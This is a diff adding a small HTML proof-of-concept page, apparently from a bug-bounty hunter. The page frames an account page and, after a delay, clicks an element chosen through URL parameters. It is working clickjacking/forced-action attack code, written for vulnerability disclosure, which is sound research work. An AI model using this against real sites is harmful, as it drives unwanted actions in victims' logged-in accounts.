@@ -1,0 +1,36 @@
+<html>
+
+<head>
+<title> POC G6G</title>
+
+</head>
+<body>
+<h1> Hello that a POC page used by Bug Hunter G6G </h1>
+<h3> To modify the page on iframe you can modify the request param "path" in url </h3>
+<h3> To modify the element to click you can modify the request param "clickon" in url  </h3>
+
+
+<iframe id="test"  width="600" height="600"></iframe>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    let path = urlParams.get("path")?? 'my-account';
+    let clickOnName = urlParams.get("clickon") ?? "contactphone";
+    let iframe = document.getElementById("test");
+    iframe.src = "/"+path;
+
+
+    console.log(1)
+    setTimeout(() => {
+        console.log(2)
+        // récuperer les elements souhaités et faire les actions voulus
+        iframe.contentWindow.document.getElementsByName(clickOnName)[0]?.click()
+
+        console.log(iframe.contentWindow.document?.getElementsByName(clickOnName)[0] + 'clicked' )
+    }, 15000);
+
+
+</script>
+
+
+</body>
+</html>
